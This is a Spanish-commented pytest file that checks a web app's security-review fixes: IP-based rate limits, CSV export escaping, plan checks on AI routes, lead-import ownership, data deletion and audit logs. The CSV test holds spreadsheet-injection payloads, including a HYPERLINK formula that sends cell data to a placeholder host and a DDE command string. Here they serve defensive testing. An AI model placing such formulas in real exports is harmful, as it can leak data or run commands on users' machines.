"""X-5 · Sprint 4 · lo que corrigió la revisión de seguridad de la rama.

Cada bloque deja fijo un hallazgo (ver el checklist de Sprint 4, X-5):
 A2  el tope por IP usa la IP que agrega Heroku, y hay tope global de correos.
 A3  el CSV de prospectos no ejecuta fórmulas al abrirse en Excel.
 M2  ninguna ruta del estudiante que llama a la IA queda sin llave del plan,
     salvo las que están en la lista blanca con su porqué.
 M3  el id de un prospecto no sirve para llevarse las respuestas de otra persona.
 M4  se puede borrar a quien lo pide, y se purga lo viejo.
 M5  ver prospectos deja rastro.
 B4/B5/B6  topes de tamaño, correo válido y duración del plan.
"""
from __future__ import annotations

import inspect
import re
from datetime import datetime, timedelta
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

from tests.test_bot_gratuito_b4 import RESPUESTAS, URL, _leads, _pedido, app_db  # noqa: F401
from tests.test_planes_d1 import _usuario


def _h(c, email):
    r = c.post("/api/v1/auth/login", json={"email": email, "password": "testpass123"})
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


# ---------------------------------------------------------------------------
# A2 · la IP
# ---------------------------------------------------------------------------


def test_el_tope_usa_la_ip_que_agrega_heroku_no_la_que_manda_el_cliente():
    from app.core.rate_limiter import InMemoryLimiter

    pedido = SimpleNamespace(
        state=SimpleNamespace(),
        headers={"x-forwarded-for": "1.1.1.1, 2.2.2.2, 203.0.113.9"},
        client=None,
    )
    assert InMemoryLimiter._client_key(pedido) == "ip:203.0.113.9"


def test_la_auditoria_y_el_consentimiento_guardan_la_misma_ip():
    from app.services.audit_service import _client_ip as ip_auditoria
    from app.services.consent_service import _client_ip as ip_consentimiento

    pedido = SimpleNamespace(headers={"x-forwarded-for": "6.6.6.6, 203.0.113.9"}, client=None)
    assert ip_auditoria(pedido) == ip_consentimiento(pedido) == "203.0.113.9"


@pytest.mark.parametrize("ya_avisados, sale_correo", [(19, True), (20, False)])
def test_tope_global_de_correos_de_caliente_por_hora(app_db, monkeypatch, ya_avisados, sale_correo):
    from app.db.models import BotConversation, UserRole
    from app.services import aviso_prospectos

    enviados = []
    monkeypatch.setattr("app.services.email_service.send_email", lambda **k: enviados.append(k))
    _, Sesion = app_db
    s = Sesion()
    _usuario(s, "ana@x5.dev", role=UserRole.GH_COMMERCIAL)
    hace_un_rato = (datetime.utcnow() - timedelta(minutes=5)).isoformat(timespec="seconds")
    for i in range(ya_avisados):
        s.add(BotConversation(name=f"p{i}", hechos={aviso_prospectos.MARCA_AVISADO: hace_un_rato},
                              transcript=[], band="hot"))
    nuevo = BotConversation(name="Nuevo", email="n@correo.com", hechos={"_fuente": "bot_gratuito"},
                            transcript=[], band="hot", score=90)
    s.add(nuevo)
    s.commit()
    assert aviso_prospectos.avisar_caliente(s, nuevo) is True
    assert bool(enviados) is sale_correo
    # Sin correo, igual queda marcado para el resumen diario.
    assert bool(nuevo.hechos.get(aviso_prospectos.MARCA_SIN_CORREO)) is (not sale_correo)
    s.close()


# ---------------------------------------------------------------------------
# A3 · CSV
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("malicioso", ['=HYPERLINK("http://x/?"&A2,"x")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(1)", "\tx"])
def test_el_csv_neutraliza_las_formulas(malicioso):
    from app.services import prospectos_service as svc

    p = svc.Prospecto(fuente="bot_gratuito", id="1", creado_en=datetime(2026, 10, 31), nombre=malicioso,
                      telefono=malicioso)
    fila = svc.a_filas_csv([p])[1]
    for celda in fila:
        assert not celda.startswith(("=", "+", "-", "@", "\t", "\r")), celda
    assert fila[2] == "'" + malicioso


def test_el_csv_no_toca_lo_normal():
    from app.services import prospectos_service as svc

    p = svc.Prospecto(fuente="quiz", id="1", creado_en=datetime(2026, 10, 31), nombre="Sara Gómez",
                      telefono="+57 300")
    fila = svc.a_filas_csv([p])[1]
    assert fila[2] == "Sara Gómez"
    # Un teléfono con + también se neutraliza: en Excel sería una fórmula.
    assert fila[4] == "'+57 300"


# ---------------------------------------------------------------------------
# M2 · ninguna ruta de IA del estudiante sin llave
# ---------------------------------------------------------------------------

# Lo que hace que una ruta "llame a la IA" · deliberadamente amplio: un falso
# positivo se resuelve agregándolo abajo con su porqué; un falso negativo es el
# hallazgo M2 otra vez.
_IA = re.compile(
    r"call_claude|ai_service\.|consolidation_service\.|recommendation_service\.|interpret"
    r"|generate_|dossier_service|year_checkin|external_test|parse_"
    # E-4 · Sprint 4 · la entrevista se escapaba: su servicio no se llama con
    # ninguno de los nombres de arriba. Toda ruta que registra consumo de IA
    # (M-001) llama a la IA, así que esa es la señal que no depende del nombre.
    r"|record_ai_usage|_registrar_uso"
)

# Rutas del equipo o del sistema: la llave del plan es del estudiante.
_DEL_EQUIPO = ("/api/v1/gh/", "/api/v1/admin/", "/api/v1/advisor-leads", "/api/v1/school/",
               "/api/v1/webhooks/", "/api/v1/reports/generate/{user_id}")

# Rutas del estudiante que llaman a la IA y son GRATIS a propósito.
GRATIS_A_PROPOSITO = {
    "/api/v1/sessions/{session_id}/interpretar": "interpreta el journey inicial, que es gratis (onboarding)",
    "/api/v1/year-checkin": "check-in de evolución del año: gratis (decisión X-5)",
    "/api/v1/external-test-uploads": "subir un test hecho afuera: gratis (decisión X-5)",
    "/api/v1/external-test-uploads/{upload_id}/parse": "ídem",
    "/api/v1/external-test-uploads/{upload_id}/confirm": "ídem",
    "/api/v1/me/tools": "solo lista las herramientas; no genera nada",
    # Decidido el 2026-10-31: gratis porque lo usa la conversación inicial,
    # pero con límite de uso (antes no tenía ninguno).
    "/api/v1/transcription/transcribe": "dictado por voz de la conversación inicial (gratis), con límite de uso",
}

# E-4 · Sprint 4 (2026-10-31) · las encontró el detector al sumarle
# `record_ai_usage`: llamaban a la IA sin llave desde antes de este sprint. JP
# decidió el mismo día: el dictado queda gratis con límite (arriba), y el lector
# de logros y el análisis de brecha pasan a pago (ver el parametrize de abajo).
# Si aparece otra, va aquí con su porqué hasta que se decida.
PENDIENTES_DE_DECISION: dict = {}


def _llaves(ruta):
    deps = list(ruta.dependant.dependencies)
    for d in list(deps):
        deps += d.dependencies
    return [d for d in deps if "requiere" in getattr(d.call, "__qualname__", "")]


def test_ninguna_ruta_de_ia_del_estudiante_queda_sin_llave():
    from app.main import app

    sin_llave = []
    for ruta in app.routes:
        if not hasattr(ruta, "dependant") or not ruta.path.startswith("/api/v1"):
            continue
        if ruta.path.startswith(_DEL_EQUIPO) or ruta.path in GRATIS_A_PROPOSITO:
            continue
        if ruta.path in PENDIENTES_DE_DECISION:
            continue
        try:
            fuente = inspect.getsource(ruta.endpoint)
        except (OSError, TypeError):
            continue
        if _IA.search(fuente) and not _llaves(ruta):
            sin_llave.append(f"{sorted(ruta.methods)} {ruta.path}")
    assert sin_llave == [], (
        "Rutas que llaman a la IA sin llave del plan. Ponles `requiere(...)` o, si son "
        f"gratis a propósito, agrégalas a GRATIS_A_PROPOSITO con su porqué: {sin_llave}"
    )


def test_no_quedan_pendientes_de_decision():
    """Las 5 que encontró el detector ya se decidieron (2026-10-31)."""
    assert PENDIENTES_DE_DECISION == {}


def test_el_dictado_gratis_tiene_limite_de_uso():
    """Gratis sí, sin freno no: cada audio se le paga a OpenAI."""
    from app.main import app

    ruta = next(r for r in app.routes if getattr(r, "path", "") == "/api/v1/transcription/transcribe")
    limites = [d for d in ruta.dependant.dependencies if "rate_limit" in getattr(d.call, "__qualname__", "")]
    assert len(limites) == 2


@pytest.mark.parametrize(
    "ruta, funcion",
    [
        ("/api/v1/journey-chat/{session_id}/turno", "chat_hopper"),
        ("/api/v1/recommendations/generate", "lectura_tests"),
        ("/api/v1/recommendations/me", "lectura_tests"),
        ("/api/v1/recommendations/retry", "lectura_tests"),
        ("/api/v1/reports/generate", "reporte_pdf"),
        ("/api/v1/routes/{session_id}/generate", "programas"),
        # Decididas por JP el 2026-10-31.
        ("/api/v1/me/logros/leer", "hoja_de_vida"),
        ("/api/v1/me/logros/leer-archivo", "hoja_de_vida"),
        ("/api/v1/me/career-gap/linkedin", "analisis_brecha"),
        ("/api/v1/me/career-gap/analyze", "analisis_brecha"),
    ],
)
def test_las_rutas_que_encontro_la_revision_ya_tienen_su_llave(ruta, funcion):
    from app.main import app

    [r] = [x for x in app.routes if getattr(x, "path", "") == ruta]
    assert _llaves(r), ruta


@pytest.mark.planes_reales
def test_un_gratis_recibe_402_en_el_chat_del_journey_y_las_recomendaciones(app_db):
    app, Sesion = app_db
    s = Sesion()
    _usuario(s, "gratis@x5.dev")
    s.close()
    with TestClient(app, raise_server_exceptions=False) as c:
        h = _h(c, "gratis@x5.dev")
        assert c.get("/api/v1/recommendations/me", headers=h).status_code == 402
        r = c.post("/api/v1/journey-chat/00000000-0000-0000-0000-000000000000/turno",
                   json={"mensaje": "hola"}, headers=h)
        assert r.status_code == 402


@pytest.mark.planes_reales
def test_un_gratis_recibe_402_en_el_lector_de_logros_y_la_brecha(app_db):
    """Decidido por JP el 2026-10-31 · y sin gastar la llamada a la IA."""
    from unittest.mock import patch

    app, Sesion = app_db
    s = Sesion()
    _usuario(s, "gratis2@x5.dev")
    s.close()
    with TestClient(app, raise_server_exceptions=False) as c,             patch("app.core.ai_client.get_client") as get_client:
        h = _h(c, "gratis2@x5.dev")
        r = c.post("/api/v1/me/logros/leer", json={"texto": "Soy capitán del equipo de fútbol"}, headers=h)
        assert r.status_code == 402
        assert r.json()["detail"]["funcion"] == "hoja_de_vida"
        r = c.post("/api/v1/me/logros/leer-archivo", headers=h,
                   files={"file": ("d.pdf", b"%PDF-1.4", "application/pdf")})
        assert r.status_code == 402
        r = c.post("/api/v1/me/career-gap/analyze", headers=h)
        assert r.status_code == 402
        assert r.json()["detail"]["funcion"] == "analisis_brecha"
        r = c.put("/api/v1/me/career-gap/linkedin", json={"texto": "x" * 50}, headers=h)
        assert r.status_code == 402
    get_client.assert_not_called()


# ---------------------------------------------------------------------------
# M3 · el traspaso
# ---------------------------------------------------------------------------


def _lead_viejo(Sesion, email, horas):
    from app.db.models import BotConversation

    s = Sesion()
    lead = BotConversation(
        name="Ajena", email=email, transcript=[], band="hot",
        hechos={"_fuente": "bot_gratuito", "respuestas": dict(RESPUESTAS)},
        created_at=datetime.utcnow() - timedelta(hours=horas),
    )
    s.add(lead)
    s.commit()
    lid = str(lead.id)
    s.close()
    return lid


@pytest.mark.parametrize(
    "email_del_lead, horas, se_lo_lleva",
    [
        ("otra@correo.com", 5, False),  # id viejo y de otra persona: no
        ("otra@correo.com", 1, True),   # recién hecho: el flujo real (mamá llena, hija se registra)
        ("mio@x5.dev", 50, True),       # viejo, pero es su correo
    ],
)
def test_el_id_de_un_prospecto_no_sirve_para_llevarse_el_de_otra_persona(app_db, email_del_lead, horas, se_lo_lleva):
    app, Sesion = app_db
    s = Sesion()
    _usuario(s, "mio@x5.dev")
    s.close()
    lid = _lead_viejo(Sesion, email_del_lead, horas)
    with TestClient(app) as c:
        r = c.post("/api/v1/bot-gratuito/importar", json={"lead_id": lid}, headers=_h(c, "mio@x5.dev"))
    assert r.status_code == 200, r.text
    assert r.json()["importado"] is se_lo_lleva


# ---------------------------------------------------------------------------
# M4 · borrar y purgar
# ---------------------------------------------------------------------------


def test_borrar_a_quien_lo_pide_en_las_tres_fuentes(app_db):
    from app.db.models import BotConversation, LeadProfile
    from app.services import prospectos_service as svc

    _, Sesion = app_db
    s = Sesion()
    s.add(BotConversation(name="A", email="Pide@Correo.com", hechos={}, transcript=[]))
    s.add(BotConversation(name="A", phone="+57 300", hechos={}, transcript=[]))
    s.add(LeadProfile(name="A", email="pide@correo.com", answers={}, profile_result={}))
    s.add(BotConversation(name="Otra", email="otra@correo.com", hechos={}, transcript=[]))
    s.commit()
    simulado = svc.borrar_por_contacto(s, email="pide@correo.com", telefono="+57 300")
    assert simulado == {"bot_conversations": 2, "lead_profiles": 1}
    assert s.query(BotConversation).count() == 3  # sin aplicar no borra
    svc.borrar_por_contacto(s, email="pide@correo.com", telefono="+57 300", aplicar=True)
    assert [b.name for b in s.query(BotConversation).all()] == ["Otra"]
    assert s.query(LeadProfile).count() == 0
    with pytest.raises(ValueError):
        svc.borrar_por_contacto(s)
    s.close()


def test_purgar_solo_lo_viejo_frio_o_descartado_y_sin_cuenta(app_db):
    from app.db.models import BotConversation
    from app.services import prospectos_service as svc

    _, Sesion = app_db
    s = Sesion()
    hace_dos_anios = datetime.utcnow() - timedelta(days=730)
    u = _usuario(s, "convertido@x5.dev")
    base = dict(hechos={}, transcript=[], created_at=hace_dos_anios)
    s.add(BotConversation(name="viejo frío", band="cold", **base))
    s.add(BotConversation(name="viejo descartado", band="hot", estado="descartado", **base))
    s.add(BotConversation(name="viejo caliente", band="hot", **base))
    s.add(BotConversation(name="viejo frío con cuenta", band="cold", converted_user_id=u.id, **base))
    s.add(BotConversation(name="nuevo frío", band="cold", hechos={}, transcript=[]))
    s.commit()
    svc.purgar_viejos(s, aplicar=True)
    quedan = sorted(b.name for b in s.query(BotConversation).all())
    assert quedan == ["nuevo frío", "viejo caliente", "viejo frío con cuenta"]
    s.close()


# ---------------------------------------------------------------------------
# M5 · auditoría
# ---------------------------------------------------------------------------


def test_ver_prospectos_deja_rastro(app_db):
    from app.db.models import AuditLog, UserRole

    app, Sesion = app_db
    s = Sesion()
    _usuario(s, "comercial@x5.dev", role=UserRole.GH_COMMERCIAL)
    s.close()
    with TestClient(app) as c:
        c.get("/api/v1/prospectos?fuente=quiz", headers=_h(c, "comercial@x5.dev"))
    s = Sesion()
    [log] = s.query(AuditLog).filter(AuditLog.action == "prospectos.consultados").all()
    assert log.payload["fuente"] == "quiz" and "resultados" in log.payload
    s.close()


# ---------------------------------------------------------------------------
# B4 · B5 · B6
# ---------------------------------------------------------------------------


def test_respuestas_enormes_se_rechazan_antes_de_leerlas(app_db):
    app, Sesion = app_db
    with TestClient(app) as c:
        r = c.post(URL, json=_pedido(respuestas={**RESPUESTAS, "flow": "x" * 5000}))
    assert r.status_code == 422
    assert _leads(Sesion) == []


@pytest.mark.parametrize("correo", ["a@b", "sin-arroba.com", "a@@b.co", "a b@c.co"])
def test_correo_invalido_se_rechaza(app_db, correo):
    app, _ = app_db
    contacto = {"nombre": "Sara", "whatsapp": "", "email": correo, "cuando": "soon"}
    with TestClient(app) as c:
        assert c.post(URL, json=_pedido(contacto=contacto)).status_code == 422


@pytest.mark.planes_reales
def test_un_plan_no_puede_durar_mas_de_24_meses(app_db):
    from app.db.models import UserRole

    app, Sesion = app_db
    s = Sesion()
    _usuario(s, "comercial2@x5.dev", role=UserRole.GH_COMMERCIAL)
    est = _usuario(s, "estudiante@x5.dev")
    eid = est.id
    s.close()
    with TestClient(app) as c:
        h = _h(c, "comercial2@x5.dev")
        lejos = (datetime.utcnow() + timedelta(days=365 * 36)).isoformat()
        r = c.post(f"/api/v1/admin/planes/{eid}", json={"plan": "pago", "hasta": lejos}, headers=h)
        assert r.status_code == 422 and "24 meses" in r.text
        ok = (datetime.utcnow() + timedelta(days=365)).isoformat()
        assert c.post(f"/api/v1/admin/planes/{eid}", json={"plan": "pago", "hasta": ok}, headers=h).status_code == 200
